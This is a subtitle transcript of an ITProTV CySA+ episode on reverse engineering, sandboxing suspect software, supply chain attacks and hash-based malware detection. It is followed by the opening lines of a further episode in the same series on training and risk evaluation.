00:10:20.400\nthey have these things they\nare available from the Internet.\n\n180\n00:10:20.400 --> 00:10:23.100\nYou can either purchase one, you can try\nto find one that's open source and free.\n\n181\n00:10:24.320 --> 00:10:27.210\nTypically, though, they are not great,\n\n182\n00:10:27.210 --> 00:10:32.170\nat least, anecdotally, in my experience,\nfrom what I've talked to people and\n\n183\n00:10:32.170 --> 00:10:36.360\nread about, they can work but\nit's kind of hit or miss.\n\n184\n00:10:36.360 --> 00:10:38.060\nSo is it worth the effort?\n\n185\n00:10:38.060 --> 00:10:40.410\nYeah, why not, right,\nif you've got one run it through,\n\n186\n00:10:40.410 --> 00:10:42.420\nsee if you can decompile,\nget the code back out.\n\n187\n00:10:42.420 --> 00:10:45.530\nIf not, you're probably stuck\nwith doing some other form\n\n188\n00:10:45.530 --> 00:10:49.700\nof throwing it in a sandbox and seeing\nwhat it does and monitoring those actions.\n\n189\n00:10:49.700 --> 00:10:53.290\nBut if you can decompile it,\nthen run it through a decompiler,\n\n190\n00:10:53.290 --> 00:10:57.897\nget that code back and then do what we do\nwith the interpretive language which is,\n\n191\n00:10:57.897 --> 00:10:59.522\ngo through it line by line and\n\n192\n00:10:59.522 --> 00:11:04.102\nsee what you can see kind of discern what\nit is that code is actually trying to do.\n\n193\n00:11:04.102 --> 00:11:08.185\nIf you see things like,\ncreate TCP socket to and\n\n194\n00:11:08.185 --> 00:11:12.280\nit gives you a URL or\nit gives you and IP address.\n\n195\n00:11:12.280 --> 00:11:14.690\nAnd you know that IP\naddress is not yours or\n\n196\n00:11:14.690 --> 00:11:18.290\nit belonged to the third party company\nthat which you purchased this thing from.\n\n197\n00:11:18.290 --> 00:11:21.595\nOr you notice it's built in,\nsome malware got attached or\n\n198\n00:11:21.595 --> 00:11:23.424\nif it's just like what is this?\n\n199\n00:11:23.424 --> 00:11:26.963\nAnd It's creating TCP Sockets\nwith open connections and\n\n200\n00:11:26.963 --> 00:11:30.435\nallowing information to be pushed back and\nforth.\n\n201\n00:11:30.435 --> 00:11:32.233\nIf you see that kind\nof activity happening,\n\n202\n00:11:32.233 --> 00:11:34.965\nit's a good indicator that that's\nsome sort of malware, right?\n\n203\n00:11:34.965 --> 00:11:39.939\nIf it's deleting actual trading files, why\nis it reading data from this area of my\n\n204\n00:11:39.939 --> 00:11:44.425\nhard drive, putting that in a zip file and\nthen pushing it out?\n\n205\n00:11:44.425 --> 00:11:47.855\nA good indication that\nsomething awry has gone,\n\n206\n00:11:47.855 --> 00:11:49.725\nso that's what you're gonna look through.\n\n207\n00:11:49.725 --> 00:11:52.100\nYou're gonna look through here,\ntry to figure out what it does,\n\n208\n00:11:52.100 --> 00:11:53.570\nthat's reverse engineering.\n&gt;&gt; So\n\n209\n00:11:53.570 --> 00:11:56.240\nit seems to me that\nisolating it in a sandbox,\n\n210\n00:11:56.240 --> 00:12:02.070\nthat's a very good place to start maybe?\n&gt;&gt; Yeah, yeah, if you find something and\n\n211\n00:12:02.070 --> 00:12:05.110\nyou're like, you know what,\nI'm not a 100% sure what this is.\n\n212\n00:12:05.110 --> 00:12:08.610\nCould be malware, could be nothing,\ncould be innocuous, I'm not sure.\n\n213\n00:12:09.680 --> 00:12:13.030\nWe do wanna whip up a sandbox\nenvironment and sandboxing,\n\n214\n00:12:13.030 --> 00:12:14.780\nis just basically isolation.\n\n215\n00:12:14.780 --> 00:12:21.071\nRight, we're gonna create an environment\nthat looks very similar if not identical\n\n216\n00:12:21.071 --> 00:12:27.022\nto our production environment, so that\nwe can run these things in a safe place.\n\n217\n00:12:27.022 --> 00:12:32.650\nwe wanna do no harm to our machines, we\nwant our production to stay in production.\n\n218\n00:12:32.650 --> 00:12:35.650\nWe don't want it to come down, we don't\nwanna fire off something that may be,\n\n219\n00:12:35.650 --> 00:12:39.900\ndeletes the hard drive or causes\na data breach or does crypto locking,\n\n220\n00:12:39.900 --> 00:12:41.470\nthat would be bad, right?\n&gt;&gt; Bad.\n\n221\n00:12:41.470 --> 00:12:43.490\n&gt;&gt; So no bueno there.\n\n222\n00:12:43.490 --> 00:12:48.509\nSo build a sandbox environment so\nthat you can isolate these things,\n\n223\n00:12:48.509 --> 00:12:54.048\nrun them with full carte blanche,\nwithout fear of repercussions of going,\n\n224\n00:12:54.048 --> 00:12:59.086\nwell I didn't know what this did, so\nI had to run it to see what it was.\n\n225\n00:12:59.086 --> 00:13:01.798\nIf you run them against your production\nservice you're asking for a problem,\n\n226\n00:13:01.798 --> 00:13:04.770\nbecause eventually one day that snake will\nbite you and that's not what you wanna do.\n\n227\n00:13:04.770 --> 00:13:09.011\nYou don't wanna be that guy or that girl,\nhaving to explain themselves go,\n\n228\n00:13:09.011 --> 00:13:12.940\nwell I found this software, or\njust this little executable package.\n\n229\n00:13:12.940 --> 00:13:17.015\nI wasn't 100% sure what it was, it was on\nthe production service, so I just ran it.\n\n230\n00:13:17.015 --> 00:13:19.720\n[LAUGH]\nWell,\n\n231\n00:13:19.720 --> 00:13:23.415\nyou can run yourself to the printer and\nget yourself a copy of your resume.\n\n232\n00:13:23.415 --> 00:13:26.470\n[LAUGH] And thanks for playing.\n&gt;&gt; See you.\n\n233\n00:13:26.470 --> 00:13:27.790\n&gt;&gt; That's not what you wanna do.\n\n234\n00:13:27.790 --> 00:13:32.858\nSo sandboxing allows us to, it's really\ngreat for discovering things like,\n\n235\n00:13:32.858 --> 00:13:36.400\nadvanced persistent threats, the APTs\nout there, we're able to isolate it.\n\n236\n00:13:36.400 --> 00:13:38.997\nWe're able to analyze it without any fear,\n\n237\n00:13:38.997 --> 00:13:42.164\nthat it's gonna cause damage\nto our actual systems.\n\n238\n00:13:42.164 --> 00:13:45.457\nAnd again, look for\nweird stuff that it's doing,\n\n239\n00:13:45.457 --> 00:13:49.990\nis it contacting anything outside of\nyour network if so where is that?\n\n240\n00:13:49.990 --> 00:13:53.560\nYou can do look-ups for\nthat kind of thing, see where it's going,\n\n241\n00:13:53.560 --> 00:13:56.820\nwhat is it contacting it for,\nwhat kind of data is it passing.\n\n242\n00:13:56.820 --> 00:14:01.294\nAnd then you just start using all your\nabilities to monitoring and detection of\n\n243\n00:14:01.294 --> 00:14:06.060\nmalware things in that environment before\nit ever touches your production stuff.\n\n244\n00:14:06.060 --> 00:14:09.695\nSo if you find it there you'll know,\nnow we've got an indicator compromise and\n\n245\n00:14:09.695 --> 00:14:11.060\nwe have to start mitigating.\n\n246\n00:14:11.060 --> 00:14:15.220\nDo we want to, just delete it and\n\n247\n00:14:15.220 --> 00:14:19.530\nplug the hole that it came in through,\nhow did we get it?\n\n248\n00:14:19.530 --> 00:14:22.873\nThese are the kinda things you're\ngonna start asking yourself if you do\n\n249\n00:14:22.873 --> 00:14:26.730\nactually find malware in your system,\nespecially if it's an APT, that's bad.\n\n250\n00:14:26.730 --> 00:14:30.816\nLet's see here, so\nthis keeps us from breaking production and\n\n251\n00:14:30.816 --> 00:14:35.550\nallows you just to just throw\neverything and the kitchen sink out.\n\n252\n00:14:35.550 --> 00:14:41.790\nSo this is why we would wanna do any\nkind of testing and reverse engineering\n\n253\n00:14:41.790 --> 00:14:45.510\ninside of the sandboxed environment so\nthat we don't cause any problems.\n\n254\n00:14:45.510 --> 00:14:47.570\nAll right, so let's move on to hardware.\n\n255\n00:14:47.570 --> 00:14:51.610\nThis was basically software reverse\nengineering, let's talk about hardware,\n\n256\n00:14:51.610 --> 00:14:57.010\nbecause Zach, I don't suppose you happen\nto have a wireless access point or\n\n257\n00:14:57.010 --> 00:15:01.380\na router or any other networking\nequipment at your home office, or\n\n258\n00:15:01.380 --> 00:15:05.410\nif you've worked in an office like,\nI don't know, ITProTV, you work here,\n\n259\n00:15:05.410 --> 00:15:06.080\nright?\n&gt;&gt; Why\n\n260\n00:15:06.080 --> 00:15:07.070\nyes, I do.\n\n261\n00:15:07.070 --> 00:15:07.690\n&gt;&gt; Yeah.\n&gt;&gt; [LAUGH]\n\n262\n00:15:07.690 --> 00:15:09.260\n&gt;&gt; And do you have any of these devices?\n\n263\n00:15:09.260 --> 00:15:11.085\n&gt;&gt; I have them, I have many of them.\n\n264\n00:15:11.085 --> 00:15:13.220\n[LAUGH]\n&gt;&gt; Right, so Zach has a, I'm sure,\n\n265\n00:15:13.220 --> 00:15:15.640\na wireless router probably at home.\n&gt;&gt; Yes.\n\n266\n00:15:15.640 --> 00:15:16.590\n&gt;&gt; I've got one at home,\n\n267\n00:15:16.590 --> 00:15:18.900\nyou probably have one at home as well,\nbut guess what?\n\n268\n00:15:18.900 --> 00:15:22.410\nDo you know that that thing is secure?\n\n269\n00:15:22.410 --> 00:15:26.610\nThat there's nothing inside of it\nthat's snooping on your traffic or\n\n270\n00:15:26.610 --> 00:15:29.440\ngiving itself access to anything\nthat's else on your network,\n\n271\n00:15:29.440 --> 00:15:32.510\nare you sure that, that is happening?\n\n272\n00:15:32.510 --> 00:15:33.182\n&gt;&gt; Hm.\n&gt;&gt; Hm.\n\n273\n00:15:33.182 --> 00:15:36.646\nNo and Cisco made this, or\n\n274\n00:15:36.646 --> 00:15:42.390\nNetgear made this, how do I know, right?\n\n275\n00:15:42.390 --> 00:15:44.005\nWell, reverse engineering,\n\n276\n00:15:44.005 --> 00:15:47.741\nyou can actually reverse engineer\nthese things if you have the skills.\n\n277\n00:15:47.741 --> 00:15:49.472\nObviously this is a highly\nskilled operation,\n\n278\n00:15:49.472 --> 00:15:52.295\nthis isn't something that your average,\neveryday Jo is gonna be able to do.\n\n279\n00:15:52.295 --> 00:15:57.175\nThis is something that is people\nthat have a very, Exacting and\n\n280\n00:15:57.175 --> 00:16:00.320\nlaser focused set of skills to perform.\n\n281\n00:16:00.320 --> 00:16:02.830\nYou have to know a lot about programming.\n\n282\n00:16:02.830 --> 00:16:04.770\nYou have to know about hardware and\nhow it works.\n\n283\n00:16:04.770 --> 00:16:05.870\n&gt;&gt; Special skill.\n\n284\n00:16:05.870 --> 00:16:09.410\n&gt;&gt; Yes, it's very much a specialty item,\n\n285\n00:16:09.410 --> 00:16:12.140\nbut if you can have that on your team,\n\n286\n00:16:12.140 --> 00:16:15.260\nit's also a very nice tool to have in\nthe toolkit to be able to perform.\n\n287\n00:16:15.260 --> 00:16:20.417\nBecause you have what's called supply\nchain attacks, very dangerous.\n\n288\n00:16:20.417 --> 00:16:25.160\nAnd apparently, and\nI don't like to bash the U.S. Government.\n\n289\n00:16:25.160 --> 00:16:28.220\nBut they've been involved\nwith these before,\n\n290\n00:16:28.220 --> 00:16:34.260\nwhere they were intercepting\nCisco devices in transit\n\n291\n00:16:34.260 --> 00:16:39.150\nand adding malicious code in there so\nthey could spy on networks.\n\n292\n00:16:39.150 --> 00:16:41.374\nThey could gain access in the networks,\nright?\n\n293\n00:16:41.374 --> 00:16:46.880\nBut they're doing it, and\nobviously, their justification for\n\n294\n00:16:46.880 --> 00:16:48.800\ndoing it would be to-\n&gt;&gt; Homeland security.\n\n295\n00:16:48.800 --> 00:16:50.730\n&gt;&gt; Right, would be for security purposes.\n\n296\n00:16:50.730 --> 00:16:54.260\nTo bolster the security of\nthe nation of the United States.\n\n297\n00:16:54.260 --> 00:16:58.290\nAnd I get that, I'll give them\nthe idea that the best intentions, but\n\n298\n00:16:58.290 --> 00:16:59.825\nwe all know where that leads us to, right?\n\n299\n00:16:59.825 --> 00:17:02.140\nHave to be careful with these things.\n\n300\n00:17:02.140 --> 00:17:04.067\nBut what if it was a threat actor, right?\n\n301\n00:17:04.067 --> 00:17:08.918\nWhat if it was, listen, a lot of people\nget the idea of threat actors as just\n\n302\n00:17:08.918 --> 00:17:13.630\nsome kid in his mom's basement and\nhe's just really good at computers.\n\n303\n00:17:13.630 --> 00:17:16.330\nAnd he likes to hack for fun and profit.\n\n304\n00:17:16.330 --> 00:17:18.200\nThat happens, that's a thing.\n\n305\n00:17:18.200 --> 00:17:21.350\nThere are also hacking organizations,\n\n306\n00:17:21.350 --> 00:17:26.420\nthese are people they come together and\nsay, we're gonna make a thing of this.\n\n307\n00:17:26.420 --> 00:17:28.820\nAnd we're gonna steal,\nand we're gonna pilfer.\n\n308\n00:17:28.820 --> 00:17:31.350\nThey're the pirates of the Internet, man.\n\n309\n00:17:31.350 --> 00:17:34.150\nAnd they're really, really smart.\n\n310\n00:17:34.150 --> 00:17:37.500\nThey're able to get at the same level\nas nation state hackers at this\n\n311\n00:17:37.500 --> 00:17:38.250\npoint in time.\n\n312\n00:17:38.250 --> 00:17:43.230\nI just read an article a couple weeks\nago about how they busted a hacking ring\n\n313\n00:17:43.230 --> 00:17:47.880\nof the leader, and\nthey've stolen over a billion dollars\n\n314\n00:17:47.880 --> 00:17:49.330\nfrom banks.\n&gt;&gt; Goodness.\n\n315\n00:17:49.330 --> 00:17:50.750\n&gt;&gt; And that their malware was\n\n316\n00:17:50.750 --> 00:17:53.570\nat the same level as nation state.\n\n317\n00:17:53.570 --> 00:17:54.640\n&gt;&gt; Goodness gracious.\n&gt;&gt; Right?\n\n318\n00:17:54.640 --> 00:17:58.190\nSo these are advanced system threats\nthat we have to look out for.\n\n319\n00:17:58.190 --> 00:18:02.969\nSo supply chain attacks is where they\ncould intercept through theft or\n\n320\n00:18:02.969 --> 00:18:05.561\nmaybe they're paying off people to,\n\n321\n00:18:05.561 --> 00:18:10.260\nhey bring the truck here,\nwe're just gonna install some stuff.\n\n322\n00:18:10.260 --> 00:18:12.730\nSo how do I know my router is clear right?\n\n323\n00:18:12.730 --> 00:18:17.410\nHow do I know my switch doesn't contain\nsomething that it should contain?\n\n324\n00:18:17.410 --> 00:18:21.580\nReverse engineering it, starting from\nthe back way and work my way in.\n\n325\n00:18:21.580 --> 00:18:26.130\nIf I have that skill set will be a great\nway to verify that there's nothing.\n\n326\n00:18:26.130 --> 00:18:29.020\nCrazy going on inside of that device.\n\n327\n00:18:29.020 --> 00:18:33.980\nLet's see here, at least we wanna make\nsure that it hasn't been tampered with.\n\n328\n00:18:33.980 --> 00:18:40.110\nThere's an interesting program that\nthe DOD actually created, back in I\n\n329\n00:18:40.110 --> 00:18:45.050\nwanna say it was 2000s, somewhere around\n2005, 2007, it was called Trusted Foundry.\n\n330\n00:18:46.200 --> 00:18:47.530\nVery cool.\n\n331\n00:18:47.530 --> 00:18:51.580\nThey said we are the nation\nof the United States and\n\n332\n00:18:51.580 --> 00:18:57.320\nit will be bad if a supply chain attack\nhappened to devices that we are using.\n\n333\n00:18:57.320 --> 00:19:03.010\nThey have to stay, I mean they are under\nconstant attack by other nation states and\n\n334\n00:19:03.010 --> 00:19:04.950\nhacking groups, right?\n\n335\n00:19:04.950 --> 00:19:10.280\nSo how do they verify the data and buy the\nbad router that had a supply chain attack?\n\n336\n00:19:10.280 --> 00:19:13.120\nWell they created this\nTrusted Foundry program.\n\n337\n00:19:13.120 --> 00:19:17.150\nBasically what they're doing\nis they started with IBM.\n\n338\n00:19:17.150 --> 00:19:20.810\nThey said, hey IBM, we know that you\nguys creating great circuits and\n\n339\n00:19:20.810 --> 00:19:23.180\nwe know that you're on the leading edge.\n\n340\n00:19:23.180 --> 00:19:27.280\nWe want access to the leading edge\ntechnology and we're gonna create security\n\n341\n00:19:27.280 --> 00:19:31.272\ncontrols in place to verify that none\nof that is actually intercept-able.\n\n342\n00:19:31.272 --> 00:19:36.100\nAnd, therefore change in any way\nthat could cause a problem with us.\n\n343\n00:19:36.100 --> 00:19:40.810\nThere could be no malware or\nmalfeasance on the supply chain itself.\n\n344\n00:19:40.810 --> 00:19:46.900\nWe're unsusceptible, at least highly\nunsusceptible to supply chain attacks.\n\n345\n00:19:46.900 --> 00:19:49.300\nSo the Trusted Foundry\nprogram was initiated so\n\n346\n00:19:49.300 --> 00:19:51.760\nthat they would get the splitting\nedge of technology for\n\n347\n00:19:51.760 --> 00:19:57.320\nthe purposes of use in the military and\nnational security devices on that network.\n\n348\n00:19:57.320 --> 00:20:00.330\nSo then they say, well,\nif we can do it with IBM,\n\n349\n00:20:00.330 --> 00:20:02.970\nwe could probably do this with\na couple other companies.\n\n350\n00:20:02.970 --> 00:20:06.525\nSo it has expanded into other companies,\nand you can get certified,\n\n351\n00:20:06.525 --> 00:20:08.069\nTrusted Foundry certified.\n\n352\n00:20:08.069 --> 00:20:11.915\nTo where you can say, yep, we provide\nintegrated circuits are leading edge\n\n353\n00:20:11.915 --> 00:20:16.670\ntechnology to the United States government\nthrough the Trusted Foundry program.\n\n354\n00:20:16.670 --> 00:20:19.560\nTherefore we are highly secure, so\n\n355\n00:20:19.560 --> 00:20:24.850\nif you know a company is certified\nin the trusted founder program.\n\n356\n00:20:25.950 --> 00:20:27.660\nYou can trust working with them.\n\n357\n00:20:27.660 --> 00:20:32.429\nSo that's a good way to, I know that\nthat is gonna have the highest level of\n\n358\n00:20:32.429 --> 00:20:36.934\nsecurity and protection against any\nof the supply chain type of attacks.\n\n359\n00:20:37.934 --> 00:20:40.500\nAll right, then just a little\nbit about OEM documentation.\n\n360\n00:20:40.500 --> 00:20:43.120\nA lot of times when you're\ndoing reverse engineering,\n\n361\n00:20:43.120 --> 00:20:46.700\nyou can look at documentation where as\nyou might not be privy to the code.\n\n362\n00:20:46.700 --> 00:20:50.840\nYou might not be privy to the devices and\nthe firmware that's inside of there, but\n\n363\n00:20:50.840 --> 00:20:52.180\njust by looking at the documentation.\n\n364\n00:20:52.180 --> 00:20:56.570\nYou kind of, think of, well,\na unit has to do x, y, and z, for\n\n365\n00:20:56.570 --> 00:20:58.410\nit to have said function.\n\n366\n00:20:58.410 --> 00:21:03.890\nBecause it's able to do function A,\nif I were to write a box that did that.\n\n367\n00:21:03.890 --> 00:21:06.100\nThen I would need to do this,\nthis, and this.\n\n368\n00:21:06.100 --> 00:21:09.460\nSo you get an idea at least\nof what's going on in there.\n\n369\n00:21:09.460 --> 00:21:10.710\nAnd then from there,\n\n370\n00:21:10.710 --> 00:21:14.090\nyou can try to reverse engineer your,\nway back through it.\n\n371\n00:21:14.090 --> 00:21:18.991\nAnd see what you thought was correct,\n\n372\n00:21:18.991 --> 00:21:23.260\nonce you gain access to the device\nitself or it's software.\n\n373\n00:21:23.260 --> 00:21:28.890\nLet's talk about software malware really\nquickly as far as the detection of it.\n\n374\n00:21:28.890 --> 00:21:35.980\nOnce we've determined, or maybe we think\nthat this thing is bad, I don't like it.\n\n375\n00:21:35.980 --> 00:21:36.490\nIt's no bueno.\n\n376\n00:21:37.720 --> 00:21:39.030\nWhat do I do at that point?\n\n377\n00:21:39.030 --> 00:21:44.140\nWell you can submit these things to\nSymantec or other companies that allow you\n\n378\n00:21:44.140 --> 00:21:50.310\nto let them tell you whether or\nnot they know of this as a known threat.\n\n379\n00:21:51.360 --> 00:21:54.220\nAnd if they don't they will add it to\ntheir notes or if they determine it to be\n\n380\n00:21:54.220 --> 00:21:58.140\na known threat, they will reverse\nengineer it and go yeah this is bad.\n\n381\n00:21:58.140 --> 00:21:59.250\nThey did that with Stuxnet.\n\n382\n00:21:59.250 --> 00:22:00.890\nStuxnet is a prime example.\n\n383\n00:22:03.506 --> 00:22:09.090\nSymantec was noticing in the reports\nthat they get from their clients,\n\n384\n00:22:09.090 --> 00:22:13.570\nin fact, there was this threat of this\noccurring over and over again and\n\n385\n00:22:13.570 --> 00:22:14.450\nthey didn't know what it was.\n\n386\n00:22:14.450 --> 00:22:16.540\nSo they started reverse engineering.\n\n387\n00:22:16.540 --> 00:22:20.240\nThey decompiled the code, started looking\nat what it does breaking it down and\n\n388\n00:22:20.240 --> 00:22:24.460\nboiling it down to what's most\nintricate details, all right.\n\n389\n00:22:24.460 --> 00:22:26.160\nAnd then they realized what it was,\n\n390\n00:22:26.160 --> 00:22:30.170\nwas a piece of code that was\nmeant to attack a centrifuge.\n\n391\n00:22:31.660 --> 00:22:32.840\nA piece of hardware.\n\n392\n00:22:32.840 --> 00:22:35.200\nIt was the controller of\nour piece of hardware.\n\n393\n00:22:35.200 --> 00:22:37.780\nAnd they said, this is how fast you\nspend and this is how you spin it.\n\n394\n00:22:38.820 --> 00:22:43.550\nAnd what it was doing was, it was gonna\noverwrite that code, the actual code for\n\n395\n00:22:43.550 --> 00:22:44.404\nthat device.\n\n396\n00:22:44.404 --> 00:22:49.039\nAnd it was a very specific type of\ncentrifuge that's used in nuclear\n\n397\n00:22:49.039 --> 00:22:51.643\nproduction of nuclear facilities for\n\n398\n00:22:51.643 --> 00:22:53.546\ncreation of bombs.\n&gt;&gt; Fun.\n\n399\n00:22:53.546 --> 00:22:54.208\n&gt;&gt; Yeah.\n\n400\n00:22:54.208 --> 00:22:55.690\n&gt;&gt; [LAUGH]\n\n401\n00:22:55.690 --> 00:22:57.060\n&gt;&gt; This could be a problem.\n\n402\n00:22:57.060 --> 00:22:59.590\nWhat it would do is,\nit would break centrifuge.\n\n403\n00:22:59.590 --> 00:23:01.390\nIt would make it spin too fast.\n\n404\n00:23:01.390 --> 00:23:03.050\nIt would report back that nothing\n\n405\n00:23:03.050 --> 00:23:04.330\nwas wrong.\n\n406\n00:23:04.330 --> 00:23:05.288\n&gt;&gt; Goodness.\n&gt;&gt; Right?\n\n407\n00:23:05.288 --> 00:23:07.390\n&gt;&gt; So the centrifuge in these systems\n\n408\n00:23:07.390 --> 00:23:12.350\nwould break but the people that were\nrunning them would be none the wiser.\n\n409\n00:23:12.350 --> 00:23:13.900\nThey'd just go why did that break?\n\n410\n00:23:13.900 --> 00:23:16.640\nIt just broke, it's not working right now.\n\n411\n00:23:16.640 --> 00:23:21.540\nAnd it's set back a nuclear program for\nthe Iranians by six to nine months,\n\n412\n00:23:21.540 --> 00:23:22.280\nor something like that.\n\n413\n00:23:22.280 --> 00:23:24.150\nIt was great.\nI said it was great,\n\n414\n00:23:24.150 --> 00:23:26.860\nit was interesting that\nthey were able to do that.\n\n415\n00:23:26.860 --> 00:23:30.670\nI mean,\nit was a very pointed piece of software.\n\n416\n00:23:30.670 --> 00:23:34.460\nBut now we have a signature of what\nStuxnet looks like and you can just get\n\n417\n00:23:34.460 --> 00:23:39.280\nsomething as simple as an MD5 hash to go,\nthis is what this looks like.\n\n418\n00:23:39.280 --> 00:23:42.985\nIf I see this hash, and\nyou can hash something really easily,.\n\n419\n00:23:42.985 --> 00:23:43.780\nLet's go to my computer.\n\n420\n00:23:45.270 --> 00:23:47.830\nIf I've got a file, which I'm sure I do.\n\n421\n00:23:47.830 --> 00:23:53.230\nSo, I've got this DDOS thing that\nwe used in a prior show, all right?\n\n422\n00:23:53.230 --> 00:23:57.850\nI can take a hash,\nI can say, md5sum ddos.sh,\n\n423\n00:23:57.850 --> 00:24:01.478\nyou notice it creates this hash file.\n\n424\n00:24:03.422 --> 00:24:08.686\nSo this is that hashing\nalgorithm [INAUDIBLE]\n\n425\n00:24:08.686 --> 00:24:15.170\ndigest of the fifth\nversion of my DDOS attack.\n\n426\n00:24:15.170 --> 00:24:20.510\nSo if someone were to find a file in\nthere, and it says not dangerous dot-SH.\n\n427\n00:24:20.510 --> 00:24:21.520\nAnd they're like, okay?\n\n428\n00:24:21.520 --> 00:24:22.240\nWhat is this, you know?\n\n429\n00:24:22.240 --> 00:24:24.190\nSomething that looks innocuous?\n\n430\n00:24:24.190 --> 00:24:28.270\nWell if they have known\nhashes of known problems,\n\n431\n00:24:28.270 --> 00:24:31.690\nI can compare the hashes and\nsee even though it's named something.\n\n432\n00:24:31.690 --> 00:24:35.080\nAnd maybe even though I can't see a name,\nit's compiled language.\n\n433\n00:24:35.080 --> 00:24:39.210\nI can look at the hash values and put them\nagainst known hashes of known threats\n\n434\n00:24:39.210 --> 00:24:41.980\nagainst what I don't know and\nsee if they line up.\n\n435\n00:24:41.980 --> 00:24:45.750\nIf they do, I know, well,\nthat's a threat I need to mitigate that.\n\n436\n00:24:45.750 --> 00:24:47.960\nSo very important thing.\n\n437\n00:24:47.960 --> 00:24:50.040\nAnd then, of course,\ndecomposition, decompiling.\n\n438\n00:24:50.040 --> 00:24:53.660\nWe need to be able to try to\ndecompile these things if we can\n\n439\n00:24:53.660 --> 00:24:55.740\nto get at the source.\n\n440\n00:24:55.740 --> 00:24:56.960\nBut that's reverse engineering.\n\n441\n00:24:56.960 --> 00:25:01.210\nWe can't get into too much super\ntechnical details just because\n\n442\n00:25:01.210 --> 00:25:03.110\nI don't have the skills.\n\n443\n00:25:03.110 --> 00:25:06.040\nTo other than looking at\ncode that I can see or\n\n444\n00:25:06.040 --> 00:25:09.220\nmaybe running through a decompiler\nto reverse engineer things.\n\n445\n00:25:09.220 --> 00:25:16.510\nThat is a upper level skill set and if you\nhave it, I am proud of you good folks.\n\n446\n00:25:16.510 --> 00:25:18.590\nAnd you're already know what I'm\ntalking about because you've reverse\n\n447\n00:25:18.590 --> 00:25:20.020\nengineered stuff before.\n\n448\n00:25:20.020 --> 00:25:25.580\nBut this is the basics of what you need\nto know about reverse engineering.\n\n449\n00:25:25.580 --> 00:25:26.990\nSo if anybody asks you\na question about it,\n\n450\n00:25:26.990 --> 00:25:29.240\nyou can be like,\nI know what a reverse engineering is.\n\n451\n00:25:29.240 --> 00:25:34.077\nThat's basically taking a finished\nproject and figuring out what it does\n\n452\n00:25:34.077 --> 00:25:39.149\nthrough means of either reviewing code,\nor de-compiling, or checking for\n\n453\n00:25:39.149 --> 00:25:42.758\nsupply chain effects, that kind of thing.\n&gt;&gt; Great job.\n\n454\n00:25:42.758 --> 00:25:43.570\nThanks Daniel.\n\n455\n00:25:43.570 --> 00:25:47.210\nSecurity practices reverse engineering,\nI learned a lot from this episode.\n\n456\n00:25:47.210 --> 00:25:48.550\nAnd before we move on, Daniel,\n\n457\n00:25:48.550 --> 00:25:51.370\nanything else you'd like to say?\n&gt;&gt; I think I'm pretty\n\n458\n00:25:51.370 --> 00:25:55.580\nreverse engineered out man.\n&gt;&gt; [LAUGH] Well thank you for\n\n459\n00:25:55.580 --> 00:25:57.440\njoining us this episode of Plus.\n\n460\n00:25:57.440 --> 00:26:00.270\nMake sure you see every single episode,\nit's good for you.\n\n461\n00:26:00.270 --> 00:26:03.593\nDaniel's done a great job putting together\na lot of information you can use now and\n\n462\n00:26:03.593 --> 00:26:04.233\nin the future.\n\n463\n00:26:04.233 --> 00:26:04.980\nAnd you'll be in the course library.\n\n464\n00:26:04.980 --> 00:26:09.290\nThere's thousands of videos there\nthat are designed to do one thing,\n\n465\n00:26:09.290 --> 00:26:09.970\nhelp you go further.\n\n466\n00:26:09.970 --> 00:26:11.290\nSo check those out, too.\n\n467\n00:26:11.290 --> 00:26:13.470\nI tell everybody you know about ITProTV.\n\n468\n00:26:13.470 --> 00:26:14.530\nITProTV is binge worthy.\n\n469\n00:26:14.530 --> 00:26:15.650\nThank's for watching.\n\n470\n00:26:15.650 --> 00:26:17.103\nI'm Zack Memos.\n&gt;&gt; And I'm Daniel Lowery.\n\n471\n00:26:17.103 --> 00:26:18.923\n&gt;&gt; We will see you again soon.\n\n472\n00:26:18.923 --> 00:26:25.670\n[MUSIC]\n\n473\n00:26:25.670 --> 00:26:32.158\n&gt;&gt; Thank you for watching ITPROTV.\n\n",

[CROSSTALK]\nYou're\n\n4\n00:00:06.714 --> 00:00:11.502\nwatching ITPROTV.\n\n5\n00:00:11.502 --> 00:00:12.694\n&gt;&gt; Hello and thank you for\n\n6\n00:00:12.694 --> 00:00:16.350\nchoosing ITPROTV empowering\nthe world through engaging learning.\n\n7\n00:00:16.350 --> 00:00:17.280\nI'm your host Zack Memos.\n\n8\n00:00:17.280 --> 00:00:20.150\nFor this episode of size up plus and\n\n9\n00:00:20.150 --> 00:00:23.670\nin this episode with security practices\nis training and risk evaluation.\n\n10\n00:00:23.670 --> 00:00:25.680\nNow what does that all mean?\n\n11\n00:00:25.680 --> 00:00:27.310\nWell let's ask Daniel Lowrie.\n\n12\n00:00:27.310 --> 00:00:28.485\nDaniel, good to see you through.\n\n13\n00:00:28.485 --> 00:00:30.325\n&gt;&gt; [LAUGH] Well, thanks for\nhaving me on the show today Zach,\n\n14\n00:00:30.325 --> 00:00:34.480\nalways a pleasure to be with you and\nI'm enjoying have Zach as my host.\n\n15\n00:00:34.480 --> 00:00:36.090\n&gt;&gt; It's new!\n&gt;&gt; It's the first time we've really gotten\n\n16\n00:00:36.090 --> 00:00:36.970\nto work with each other.\n\n17\n00:00:36.970 --> 00:00:37.490\n&gt;&gt; It's newness.\n\n18\n00:00:37.490 --> 00:00:40.770\n&gt;&gt; And it is so much fun we're having a\ngreat time, hopefully you guys, out there,\n\n19\n00:00:40.770 --> 00:00:42.580\nare having great time with us.\n\n20\n00:00:42.580 --> 00:00:45.920\nWe're going to move on forward with\nsome of our security practices, and\n\n21\n00:00:45.920 --> 00:00:50.840\ntoday as Zach mentioned we are going\nto be talking about training and\n\n22\n00:00:50.840 --> 00:00:53.980\nrisk evaluation, evaluation of risk.\n\n23\n00:00:53.980 --> 00:00:57.980\nSome things we need to know for\nour CYSA plus exam II,\n\n24\n00:00:57.980 --> 00:01:00.600\nspell it all out in a pretty,\npink package.\n\n25\n00:01:00.600 --> 00:01:02.080\n&gt;&gt; Mm-hm.\n&gt;&gt; Yes, all right.\n\n26\n00:01:02.080 --> 00:01:03.680\nSo let's talk training.\n\n27\n00:01:03.680 --> 00:01:07.560\nTraining is an important part\nof security practices because,\n\n28\n00:01:07.560 --> 00:01:12.050\nas I love to say all the time,\nwhen it comes to security.\n\n29\n00:01:12.050 --> 00:01:15.440\nAnd when it comes to just about\nanything that's to do with cyber\n\n30\n00:01:15.440 --> 00:01:18.160\nyou are never stepping\ninto the same river twice.\n\n31\n00:01:18.160 --> 00:01:19.620\n&gt;&gt; It's constantly evolving.\n\n32\n00:01:19.620 --> 00:01:21.360\nIt's constantly changing.\n\n33\n00:01:21.360 --> 00:01:24.970\nThe thing that is a threat\ntoday is 